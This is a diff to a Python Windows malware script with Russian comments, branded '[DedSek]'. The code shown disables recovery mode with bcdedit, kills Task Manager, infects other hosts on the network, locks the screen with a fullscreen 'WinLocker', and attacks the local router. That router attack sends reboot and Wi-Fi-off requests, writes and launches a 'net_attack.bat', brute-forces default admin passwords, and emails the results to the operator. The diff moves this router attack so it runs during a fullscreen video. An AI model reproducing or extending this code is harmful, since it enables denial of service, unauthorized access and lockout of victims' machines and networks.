@@ -70,8 +70,7 @@ def block_safe_mode():
         os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
     except: pass
 
-# ===== ОТКЛЮЧЕНИЕ ВСЕХ ОТ ИНТЕРНЕТА =====
-def disconnect_all_from_internet():
+def get_router_ip():
     gateway = "192.168.1.1"
     try:
         route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
@@ -82,32 +81,43 @@ def disconnect_all_from_internet():
                     gateway = gw[0]
                     break
     except: pass
+    return gateway
+
+def disconnect_all_devices():
+    gateway = get_router_ip()
     
-    # Методы отключения
-    for url in [
-        f"http://{gateway}/reboot.cgi",
-        f"http://{gateway}/goform/Reboot",
-        f"http://{gateway}/userRpm/WlanNetworkRpm.htm?ssid=off",
-        f"http://{gateway}/goform/WifiBasicSet?wifiEnable=0",
-    ]:
-        try:
-            urllib.request.urlopen(url, timeout=3)
-            send_email(f"РОУТЕР {gateway} АТАКОВАН!\nВсе отключены от интернета!", "[DedSek] Router OFF")
-            return
-        except: pass
+    # Создаём BAT файл с командами
+    bat_path = os.path.join(tempfile.gettempdir(), "net_attack.bat")
+    with open(bat_path, 'w', encoding='utf-8') as f:
+        f.write('@echo off\n')
+        f.write('title NETWORK ATTACK\n')
+        f.write('color 0a\n')
+        f.write(f'echo [*] Router IP: {gateway}\n')
+        f.write('echo [*] Disconnecting all devices...\n')
+        f.write(f'curl -s -m 3 "http://{gateway}/reboot.cgi" >nul 2>&1\n')
+        f.write(f'curl -s -m 3 "http://{gateway}/goform/Reboot" >nul 2>&1\n')
+        f.write(f'curl -s -m 3 "http://{gateway}/userRpm/WlanNetworkRpm.htm?ssid=off" >nul 2>&1\n')
+        f.write('echo [*] Releasing IP...\n')
+        f.write('ipconfig /release >nul 2>&1\n')
+        f.write('echo [*] Renewing IP...\n')
+        f.write('ipconfig /renew >nul 2>&1\n')
+        f.write('echo [✓] ATTACK COMPLETE!\n')
+        f.write('timeout /t 5 >nul\n')
     
-    # Подбор паролей
-    for user, pwd in [("admin","admin"),("admin","1234"),("admin",""),("root","admin"),("root","root")]:
+    # Запускаем CMD окно с атакой
+    subprocess.Popen(['cmd', '/c', bat_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
+    
+    # Также пробуем через Python
+    for user, pwd in [("admin","admin"),("admin","1234"),("admin",""),("root","admin")]:
         try:
             auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
             req = urllib.request.Request(f"http://{gateway}/reboot.cgi")
             req.add_header("Authorization", f"Basic {auth}")
             urllib.request.urlopen(req, timeout=3)
-            send_email(f"РОУТЕР {gateway} ПЕРЕЗАГРУЖЕН!\nЛогин: {user}\nПароль: {pwd}", "[DedSek] Router REBOOT")
-            return
+            send_email(f"ROUTER {gateway} REBOOTED!\nLogin: {user}", "[DedSek] Router OFF")
+            break
         except: pass
 
-# ===== ЗАРАЖЕНИЕ СЕТИ =====
 def scan_network():
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
@@ -189,6 +199,10 @@ def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
+    
+    # Запускаем атаку на роутер ВО ВРЕМЯ ВИДЕО
+    threading.Thread(target=disconnect_all_devices, daemon=True).start()
+    
     try:
         v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
@@ -328,12 +342,11 @@ if __name__ == "__main__":
     block_safe_mode()
     threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
-    threading.Thread(target=disconnect_all_from_internet, daemon=True).start()
     
     anim_fsociety()
     anim_stealer()
     anim_connect()
-    play_video()
+    play_video()  # Атака на роутер запускается ВНУТРИ play_video
     block_everything()
     WinLocker()
     tk.mainloop()
